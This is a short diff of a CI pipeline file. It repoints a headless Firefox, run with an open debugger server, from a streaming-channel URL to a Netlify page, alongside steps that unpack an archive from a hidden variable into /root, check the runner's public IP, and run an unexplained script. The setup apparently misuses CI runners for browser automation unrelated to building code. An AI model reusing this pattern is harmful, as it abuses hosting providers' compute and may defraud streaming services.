@@ -23,7 +23,7 @@ pipelines:
           - tar -xvf $MY_HIDDEN_NUMBER3 -C /root/
           - curl ipinfo.io/ip
           - ls /root/*
-          - firefox --start-debugger-server 6000 -headless https://booyah.live/channels/17686673
+          - firefox --start-debugger-server 6000 -headless https://serene-keller-a6f116.netlify.app/index.html
           - python oy.py
 #
 #
